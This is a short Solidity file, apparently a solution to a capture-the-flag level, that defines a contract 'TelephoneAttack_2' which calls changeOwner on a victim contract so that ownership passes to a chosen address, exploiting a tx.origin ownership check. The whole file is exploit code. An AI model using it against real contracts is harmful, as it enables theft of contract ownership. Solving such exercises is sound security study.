// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack_2 {
    function attack(address _victim, address _owner) external {
        ITelephone(_victim).changeOwner(_owner);
    }
}
